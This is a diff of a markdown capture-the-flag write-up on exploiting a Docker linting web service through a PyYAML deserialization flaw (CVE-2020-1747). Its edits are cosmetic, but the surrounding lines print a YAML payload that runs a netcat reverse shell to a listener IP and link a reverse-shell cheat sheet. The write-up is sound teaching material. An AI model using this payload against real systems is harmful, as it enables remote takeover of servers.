@@ -29,7 +29,7 @@ the VPN to solve this challenge (see `RESOURCES` on top).
 
 Here is a screenshot of the _Docker Linter Service_:
 
-![](screenshot_docker_linter.png){width=100%}
+![](screenshot_docker_linter.png)
 
 The web service allowed you to upload different kind of docker files in order
 to lint them. Posting an arbitrary string like `ladida` instead of an actual
@@ -49,7 +49,7 @@ docker file was enough to get a list of the involved tools and libraries:
     * `dotenv-linter`
 
 After a lot of trial and error attacking the python YAML implementation turned
-out to be the right way. There is a [PoC (CVE-2020-1747)] available about it.
+out to be the right way. There is a [PoC (CVE-2020-1747)]() available about it.
 
 [PoC (CVE-2020-1747)]: https://2130706433.net/blog/pyyaml/
 
@@ -57,8 +57,8 @@ The attack works by exploiting a deserialization vulnerability in the PyYAML
 library which allows arbitrary code execution and thus including setting up a
 reverse shell.
 
-The payload was constructed according to the [script gist] available on the same
-webpage as the PoC and a [cheat sheet kinda resource for reverse shells]:
+The payload was constructed according to the [script gist]() available on the same
+webpage as the PoC and a [cheat sheet kinda resource for reverse shells]():
 
 [script gist]: https://gist.github.com/adamczi/23a3b6d4bb7b2be35e79b0667d6682e1
 [cheat sheet kinda resource for reverse shells]: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp
@@ -69,7 +69,7 @@ webpage as the PoC and a [cheat sheet kinda resource for reverse shells]:
   listitems: "__import__('os').system('nc 10.13.0.6 4242 -e /bin/sh')"
 ```
 
-![](screenshot_payload.png){width=100%}
+![](screenshot_payload.png)
 
 On the other end there was a VM connected via a VPN and listening for an
 incoming connection on port 4242:
